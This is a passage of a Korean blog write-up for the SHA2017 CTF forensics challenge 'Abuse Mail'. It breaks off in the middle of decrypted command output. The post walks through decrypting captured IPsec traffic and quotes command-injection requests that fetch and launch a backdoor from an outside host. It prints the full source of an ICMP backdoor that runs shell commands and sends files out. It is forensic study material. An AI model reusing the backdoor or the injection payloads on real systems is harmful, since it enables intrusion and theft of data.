@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    <title>SHA2017 CTF - Abuse Mail (300 pts.) | kimtruth&#39;s Blog</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+        <meta name="keywords" content="SHA2017 CTF">
+    
+    <meta name="description" content="Our abuse desk received an mail that someone from our network has hacked their company. With their help we found some suspected traffic in our network logs, but we can’t find what exactly has happene">
+<meta name="keywords" content="SHA2017 CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SHA2017 CTF - Abuse Mail (300 pts.)">
+<meta property="og:url" content="https://kimtruth.github.io/2017/08/07/SHA2017-CTF-Abuse-Mail-300-pts/index.html">
+<meta property="og:site_name" content="kimtruth&#39;s Blog">
+<meta property="og:description" content="Our abuse desk received an mail that someone from our network has hacked their company. With their help we found some suspected traffic in our network logs, but we can’t find what exactly has happene">
+<meta property="og:locale" content="kr">
+<meta property="og:image" content="https://kimtruth.github.io/2017/08/07/SHA2017-CTF-Abuse-Mail-300-pts/img01.png">
+<meta property="og:updated_time" content="2018-03-04T03:13:22.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SHA2017 CTF - Abuse Mail (300 pts.)">
+<meta name="twitter:description" content="Our abuse desk received an mail that someone from our network has hacked their company. With their help we found some suspected traffic in our network logs, but we can’t find what exactly has happene">
+<meta name="twitter:image" content="https://kimtruth.github.io/2017/08/07/SHA2017-CTF-Abuse-Mail-300-pts/img01.png">
+<meta property="fb:admins" content="1984693938443783">
+<meta property="fb:app_id" content="1984693938443783">
+    
+
+    
+
+    
+        <link rel="icon" href="/images/favicon.ico">
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/libs/titillium-web/styles.css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <script src="/libs/jquery/2.0.3/jquery.min.js"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+    
+    
+        <link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+    
+    
+        <script type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-88959679-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+    
+    
+
+
+<link rel="alternate" href="/rss2.xml" title="kimtruth's Blog" type="application/rss+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+</html>
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+            <!--
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                </div>
+            -->
+            <div id="header-title" style="text-align:left">
+                <h1>
+                    <a href="/" style="font-size:40px;color:#fff; font-weight:bold; font-style: italic;text-decoration: none;">kimtruth's Blog</a>
+                </h1>
+            </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/">Inici</a>
+                                </li>
+                            
+                                        <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Development/">Development</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Development/Algorithm/">Algorithm</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Development/iOS/">iOS</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/">Hacking</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Crpto/">Crpto</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Crypto/">Crypto</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Forensic/">Forensic</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Misc/">Misc</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Network/">Network</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Pwnable/">Pwnable</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Reversing/">Reversing</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Hacking/Web/">Web</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Question/">Question</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Story/">Story</a></li></ul>
+                                    
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="https://www.rocketpunch.com/@kimtruth">Quant a</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Cercar" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'categories',
+            TAGS: 'etiquetes',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/Hacking/">Hacking</a><i class="icon fa fa-angle-right"></i><a class="page-title-link" href="/categories/Hacking/Network/">Network</a>
+    </h1>
+</div>
+                        <div class="main-body-content">
+                            <article id="post-SHA2017-CTF-Abuse-Mail-300-pts" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        SHA2017 CTF - Abuse Mail (300 pts.)
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-meta">
+                
+    <div class="article-date">
+        <a href="/2017/08/07/SHA2017-CTF-Abuse-Mail-300-pts/" class="article-date">
+            <time datetime="2017-08-07T05:27:49.000Z" itemprop="datePublished">2017-08-07</time>
+        </a>
+    </div>
+
+                
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/SHA2017-CTF/">SHA2017 CTF</a>
+    </div>
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <blockquote>
+<p>Our abuse desk received an mail that someone from our network has hacked their company. With their help we found some suspected traffic in our network logs, but we can’t find what exactly has happened. Can you help us to catch the culprit?</p>
+<p>(<a href="/2017/08/07/SHA2017-CTF-Abuse-Mail-300-pts/abusemail.tgz" title="abusemail.tgz">abusemail.tgz</a>)  <code>233b7cb7f8113baca2f8d29d74105887</code></p>
+</blockquote>
+<p>문제 풀이과정이 기므로 잡다한 문제 설명은 생략하고 풀이 과정만 집중하겠다.</p>
+<p>먼저 <code>abuse01.pcap</code> 파일을 보자.</p>
+<p><code>telnet</code>을 보면 <code>esp</code>의 설정 값을 알 수 있다.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@vpn1: ~.root@vpn1:~# ip xfrm state</span><br><span class="line">src 10.11.0.1 dst 10.11.0.83</span><br><span class="line">	proto esp spi 0xce9b2ab8 reqid 1 mode tunnel</span><br><span class="line">	replay-window 32 flag af-unspec</span><br><span class="line">	auth-trunc hmac(sha1) 0x17f298179ebf35a4fa12d5d2c3f3b0466f435282 96</span><br><span class="line">	enc cbc(aes) 0xfb59dc471ca7f58beb30cd0d1bcbb83d6bc0fe76bca7e92bf5c0e455b23e4fe4</span><br><span class="line">	encap type espinudp sport 4500 dport 4500 addr 0.0.0.0</span><br><span class="line">	anti-replay context: seq 0x0, oseq 0xd, bitmap 0x00000000</span><br><span class="line">src 10.11.0.83 dst 10.11.0.1</span><br><span class="line">	proto esp spi 0xcaa4cf43 reqid 1 mode tunnel</span><br><span class="line">	replay-window 32 flag af-unspec</span><br><span class="line">	auth-trunc hmac(sha1) 0xab7271cc8e3d0c403ed75323f8f8f582c784e821 96</span><br><span class="line">	enc cbc(aes) 0x28fcaa9d777f940fac57e1be15477f5f074547b6a723df9243b0eb06bdd74619</span><br><span class="line">	encap type espinudp sport 4500 dport 4500 addr 0.0.0.0</span><br><span class="line">	anti-replay context: seq 0xd, oseq 0x0, bitmap 0x00001fff</span><br><span class="line">.]0;root@vpn1: ~.root@vpn1:~#</span><br></pre></td></tr></table></figure>
+<p><code>Wireshark</code>의 설정에 들어가서 <code>ESP</code>부분에 key를 추가해주자</p>
+<img src="/2017/08/07/SHA2017-CTF-Abuse-Mail-300-pts/img01.png">
+<p>첫 번째 셋팅<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">protocol : IPv4</span><br><span class="line">src ip : 10.11.0.1</span><br><span class="line">dst ip : 10.11.0.83</span><br><span class="line">SPI : *</span><br><span class="line">encryption : AES-CBC [RFC3062]</span><br><span class="line">key : 0xfb59dc471ca7f58beb30cd0d1bcbb83d6bc0fe76bca7e92bf5c0e455b23e4fe4</span><br><span class="line">authentication : HMAC-SHA-1-96 [RFC2404]</span><br><span class="line">authentication key : 0x17f298179ebf35a4fa12d5d2c3f3b0466f435282</span><br></pre></td></tr></table></figure></p>
+<p>두 번째 셋팅<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">protocol : IPv4</span><br><span class="line">src ip : 10.11.0.83</span><br><span class="line">dst ip : 10.11.0.1</span><br><span class="line">SPI : *</span><br><span class="line">encryption : AES-CBC [RFC3062]</span><br><span class="line">key : 0x28fcaa9d777f940fac57e1be15477f5f074547b6a723df9243b0eb06bdd74619</span><br><span class="line">authentication : HMAC-SHA-1-96 [RFC2404]</span><br><span class="line">authentication key : 0xab7271cc8e3d0c403ed75323f8f8f582c784e821</span><br></pre></td></tr></table></figure></p>
+<p>그렇게 복호화된 패킷들속에서 <code>HTTP</code>부분을 보면 <code>backdoor.py</code>를 다운받고 실행하는것을 볼 수 있다.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /?ip=%3Bwget%20http://10.5.5.207/backdoor.py%20-O%20/tmp/backdoor.py HTTP/1.1</span><br><span class="line">Host: 10.29.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+<h3 id="backdoor-py"><a href="#backdoor-py" class="headerlink" title="backdoor.py"></a>backdoor.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BS = <span class="number">16</span></span><br><span class="line">pad = <span class="keyword">lambda</span> s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)</span><br><span class="line">unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</span><br><span class="line">magic = <span class="string">"SHA2017"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">( self, key )</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">( self, raw )</span>:</span></span><br><span class="line">        raw = pad(raw)</span><br><span class="line">        iv = Random.new().read( AES.block_size )</span><br><span class="line">        cipher = AES.new( self.key, AES.MODE_CBC, iv )</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode( iv + cipher.encrypt( raw ) )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">( self, enc )</span>:</span></span><br><span class="line">        enc = base64.b64decode(enc)</span><br><span class="line">        iv = enc[:<span class="number">16</span>]</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv )</span><br><span class="line">        <span class="keyword">return</span> unpad(cipher.decrypt( enc[<span class="number">16</span>:] ))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    ps = subprocess.Popen(cmd,shell=<span class="keyword">True</span>,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)</span><br><span class="line">    output = ps.communicate()[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_ping</span><span class="params">(host, magic, data)</span>:</span></span><br><span class="line">    data = cipher.encrypt(data)</span><br><span class="line">    load = <span class="string">"&#123;&#125;:&#123;&#125;"</span>.format(magic, data)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    sr(IP(dst=host)/ICMP()/load, timeout=<span class="number">1</span>, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunks</span><span class="params">(L, n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(L), n):</span><br><span class="line">        <span class="keyword">yield</span> L[i:i+n]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_file</span><span class="params">(host, magic, fn)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    data = base64.urlsafe_b64encode(open(fn, <span class="string">"rb"</span>).read())</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    icmp_threads = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> chunks(data, <span class="number">500</span>):</span><br><span class="line">        t = threading.Thread(target = send_ping, args = (host,magic, <span class="string">"getfile:&#123;&#125;:&#123;&#125;"</span>.format(cnt,line)))</span><br><span class="line">        t.daemon = <span class="keyword">True</span></span><br><span class="line">        t.start()</span><br><span class="line">        icmp_threads.append(t)</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> icmp_threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cipher = AESCipher(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pkts = sniff(filter=<span class="string">"icmp"</span>, timeout =<span class="number">5</span>,count=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> packet <span class="keyword">in</span> pkts:</span><br><span class="line">             <span class="keyword">if</span>  str(packet.getlayer(ICMP).type) == <span class="string">"8"</span>:</span><br><span class="line">                input = packet[IP].load</span><br><span class="line">                <span class="keyword">if</span> input[<span class="number">0</span>:len(magic)] == magic:</span><br><span class="line">                    input = input.split(<span class="string">":"</span>)</span><br><span class="line">                    data = cipher.decrypt(input[<span class="number">1</span>]).split(<span class="string">":"</span>)</span><br><span class="line">                    ip = packet[IP].src</span><br><span class="line">                    <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">"command"</span>:</span><br><span class="line">                        output = run_command(data[<span class="number">1</span>])</span><br><span class="line">                        send_ping(ip, magic, <span class="string">"command:&#123;&#125;"</span>.format(output))</span><br><span class="line">                    <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">"getfile"</span>:</span><br><span class="line">                        <span class="comment">#print "[+] Sending file &#123;&#125;".format(data[1])</span></span><br><span class="line">                        get_file(ip, magic, data[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p>그리고 다음과 같은 패킷을 통해서 <code>sys.argv[1]</code>이 <code>K8djhaIU8H2d1jNb</code>라는걸 알 수 있다.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /?ip=%3Bnohup%20sudo%20python%20/tmp/backdoor.py%20K8djhaIU8H2d1jNb%20\&amp; HTTP/1.1</span><br><span class="line">Host: 10.29.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+<p>일단 <code>backdoor.py</code>를 보면 <code>ICMP</code>를 통해서 백도어가 실행되는것을 알 수 있다.</p>
+<p><code>abuse01.pcap</code>에는 별다른 파일이 없으니 <code>abuse02.pcap</code>을 보자.</p>
+<img src="/2017/08/07/SHA2017-CTF-Abuse-Mail-300-pts/img02.png">
+<p><code>backdoor</code>로 통신하는 모습이 보인다. 일단 저 내용이 궁금하니 빼오자.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">BS = <span class="number">16</span></span><br><span class="line">unpad = <span class="keyword">lambda</span> s : s[<span class="number">0</span>:-ord(s[<span class="number">-1</span>])]</span><br><span class="line">magic = <span class="string">"SHA2017"</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AESCipher</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">( self, key )</span>:</span></span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">( self, enc )</span>:</span></span><br><span class="line">        enc = base64.b64decode(enc)</span><br><span class="line">        iv = enc[:<span class="number">16</span>]</span><br><span class="line">        cipher = AES.new(self.key, AES.MODE_CBC, iv )</span><br><span class="line">        <span class="keyword">return</span> unpad(cipher.decrypt( enc[<span class="number">16</span>:] ))</span><br><span class="line"></span><br><span class="line"><span class="comment"># tshark -r abuse02.pcap -Y 'icmp.type==8' -T fields -e data &gt; icmps.txt</span></span><br><span class="line">data = open(<span class="string">'icmps.txt'</span>).read()</span><br><span class="line">cmds = map(<span class="keyword">lambda</span> x: x.decode(<span class="string">'hex'</span>), data.split(<span class="string">'\n'</span>)[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">cipher = AESCipher(<span class="string">'K8djhaIU8H2d1jNb'</span>)</span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> cmds:</span><br><span class="line">    cmd = cmd.split(magic + <span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">    data = cipher.decrypt(cmd)</span><br><span class="line">    <span class="keyword">print</span> data</span><br></pre></td></tr></table></figure>
+<h3 id="결과"><a href="#결과" class="headerlink" title="결과"></a>결과</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line">command:ls -la</span><br><span class="line">command:total 16</span><br><span class="line">drwxr-xr-x 3 root     root     4096 Jul 26 09:36 .</span><br><span class="line">drwxr-xr-x 3 root     root     4096 Jul 26 03:45 ..</span><br><span class="line">drwxr-x--- 2 www-data www-data 4096 Jul 26 09:37 css</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 1664 Jul 